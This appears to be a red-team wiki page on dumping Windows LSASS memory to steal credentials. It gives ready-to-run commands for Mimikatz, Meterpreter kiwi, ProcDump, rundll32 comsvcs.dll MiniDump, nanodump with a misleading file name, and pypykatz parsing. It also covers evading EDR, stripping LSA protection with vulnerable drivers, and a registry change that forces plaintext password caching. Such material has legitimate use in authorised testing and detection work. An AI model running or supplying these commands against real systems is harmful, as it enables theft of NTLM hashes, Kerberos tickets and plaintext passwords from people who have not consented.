---
title: "Attacking LSASS"
description: "Techniques for dumping credentials from LSASS memory using Mimikatz, ProcDump, comsvcs.dll, and nanodump."
tags:
  - password-attacks
  - lsass
  - mimikatz
  - procdump
  - credentials
  - memory-dump
icon: material/key
---

# 🧠 Attacking LSASS

The **Local Security Authority Subsystem Service (LSASS)** (`lsass.exe`) is responsible for enforcing security policy on a Windows system. To provide a seamless Single Sign-On (SSO) experience, LSASS caches authentication material in its memory.

If you have Local Administrator or SYSTEM privileges, dumping LSASS memory allows you to extract:
- NTLM hashes (for Pass the Hash)
- Kerberos TGTs and TGSs (for Pass the Ticket)
- Plaintext passwords (if WDigest is enabled or on older OS versions)

Because dumping LSASS is so lucrative, it is heavily monitored by EDR and Antivirus solutions.

---

## 1️⃣ In-Memory Extraction (Mimikatz)

**Mimikatz** is the gold standard for extracting credentials from LSASS. It injects directly into the LSASS process and parses the memory structures in real-time.

### Running Mimikatz locally
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Via Metasploit (Kiwi)
```bash
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_all
```

!!! warning
    **OPSEC Warning:** Dropping `mimikatz.exe` to disk or running `load kiwi` in memory is highly signatured. In any modern, monitored environment, this will trigger an immediate alert and kill your session.

---

## 2️⃣ Dumping LSASS to Disk (ProcDump)

A safer alternative to running Mimikatz on the target is to create a memory dump of the `lsass.exe` process, exfiltrate the dump file to your attacker machine, and parse it offline.

Sysinternals **ProcDump** is a legitimate Microsoft diagnostic tool that can create process dumps. Because it's signed by Microsoft, it sometimes bypasses basic AV (though EDRs heavily monitor its use against LSASS).

```cmd
# Find the PID of lsass.exe
C:\> tasklist /fi "imagename eq lsass.exe"

# Dump LSASS memory to a file (requires Admin privileges)
# -ma = Full memory dump
# -accepteula = bypass the popup
C:\> procdump.exe -ma -accepteula lsass.exe C:\temp\lsass.dmp
```

Once you have `lsass.dmp`, download it to your attacker machine and parse it with Mimikatz offline or Pypykatz.

---

## 3️⃣ Living off the Land (comsvcs.dll)

Instead of uploading ProcDump, you can use a built-in Windows DLL (`comsvcs.dll`) to dump LSASS memory. This is a classic "Living off the Land" (LotL) technique.

The `MiniDumpW` function inside `comsvcs.dll` can be called via `rundll32.exe`.

```cmd
# 1. Find the LSASS PID
C:\> tasklist /fi "imagename eq lsass.exe"
# Example PID: 652

# 2. You must have SeDebugPrivilege (usually requires SYSTEM or elevated Admin)
# 3. Call the MiniDumpW function
C:\> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 652 C:\temp\lsass.dmp full
```

!!! note
    While this uses built-in tools, calling `comsvcs.dll` against the LSASS PID is a widely known technique and is flagged by most modern EDRs.

---

## 4️⃣ Stealthy Dumping (Nanodump / Outflank)

Because standard tools are so heavily monitored, offensive developers create specialized tools that use direct system calls and API unhooking to bypass EDRs when dumping LSASS.

### Nanodump
Nanodump (by Helpsystems/Fortra) is designed to create a minidump of LSASS while evading detection. It uses syscalls to avoid API hooking and can write the dump file with a misleading extension.

```bash
# Execute nanodump via Cobalt Strike or a stealthy loader
nanodump --write C:\temp\legit_file.txt
```

---

## 5️⃣ Parsing the Dump File (Offline)

Once you have successfully exfiltrated `lsass.dmp` to your attacker machine, you parse it to extract the credentials.

### Using Pypykatz (Linux/macOS)
Pypykatz is a pure Python implementation of Mimikatz.
```bash
# Install
pip3 install pypykatz

# Parse the dump
pypykatz lsa minidump lsass.dmp
```

### Using Mimikatz (Windows)
```cmd
mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 6️⃣ Bypassing Defenses

### Bypassing LSA Protection (RunAsPPL)
If Windows is configured with **Protected Process Light (PPL)**, you cannot dump LSASS even as SYSTEM. PPL prevents non-PPL processes from reading LSASS memory.

If you attempt a dump and get an `Access Denied` error despite being SYSTEM, PPL is likely enabled. You must use a tool like `mimidrv.sys` (a signed driver included with Mimikatz) or `BYOVD` (Bring Your Own Vulnerable Driver) exploits to strip the PPL protection in kernel space before dumping.

### Forcing WDigest to Cache Plaintext Passwords
Modern Windows versions disable WDigest plaintext caching by default. If you compromise a machine but find only hashes in LSASS, you can enable WDigest in the registry. You must then wait for an administrator to log in again, after which their plaintext password will be cached.

```cmd
# Enable WDigest
C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
*(Wait for a user to log in, then dump LSASS again).*

---

!!! warning
    **Dumping LSASS memory is one of the most monitored activities on a Windows endpoint. Expect heavy resistance from EDR solutions and proceed with caution during Red Team engagements.**
